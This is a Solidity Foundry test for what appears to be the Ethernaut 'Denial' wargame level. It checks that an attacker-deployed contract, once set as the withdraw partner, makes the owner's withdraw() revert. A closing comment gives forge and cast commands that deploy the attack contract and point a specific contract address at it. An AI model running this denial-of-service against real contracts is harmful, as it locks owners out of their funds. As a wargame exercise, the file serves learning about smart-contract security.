// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Denial} from "../src/Denial.sol";
import {DenialAttack} from "../solutions/DenialAttack.sol";

contract DenialTest is Test {
    Denial public denial;
    DenialAttack public attackContract;
    address public attacker;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        vm.prank(owner);
        denial = new Denial();
    }

    function test_denial() public {
        vm.startPrank(attacker);

        attackContract = new DenialAttack();
        denial.setWithdrawPartner(address(attackContract));
        assertEq(denial.partner(), address(attackContract));

        vm.stopPrank();

        vm.startPrank(owner);

        vm.expectRevert();
        denial.withdraw();

        vm.stopPrank();
    }
}

/*
source .env
export denial=0x12394DAE10f9421e8111311524c594f58Cc06a0D

forge create solutions/DenialAttack.sol:DenialAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY
export attackContract=0x48178e6A145BA63A9A595eF6005C87C13D7F543a
cast send $denial "setWithdrawPartner(address)" $attackContract --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast call $denial "partner()" --rpc-url $RPC_URL
*/
